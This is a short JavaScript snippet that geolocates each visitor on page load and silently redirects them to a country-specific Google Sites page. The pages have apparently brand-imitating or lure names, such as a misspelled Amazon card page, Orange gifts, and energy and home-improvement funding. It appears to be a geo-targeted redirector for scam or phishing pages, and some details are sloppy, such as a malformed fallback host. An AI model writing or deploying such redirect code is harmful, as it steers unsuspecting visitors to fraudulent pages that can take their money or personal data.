document.addEventListener("DOMContentLoaded", async () => {
    try {
        const response = await fetch("https://ipapi.co/json/");
        const data = await response.json();
        const countryCode = data.country_code;

        // Map countries to landing pages
        const landingPages = {
            US: "https://sites.google.com/view/card-aamazon/home",
            UK: "https://sites.google.com/view/dontmissi/home",
            FR: "https://sites.google.com/view/orangecadeux/home",
            IT: "https://sites.google.com/view/scottishwindowsdoorsfunding/home",
            NL: "https://sites.google.com/view/nationaalenergiecollectief/home",
        };

        // Redirect or fallback
        window.location.href = landingPages[countryCode] || "https://site.google.com/global-home-improvement";
    } catch (error) {
        console.error("Redirect error:", error);
        window.location.href = "https://site.google.com/global-home-improvement"; // Default fallback
    }
});
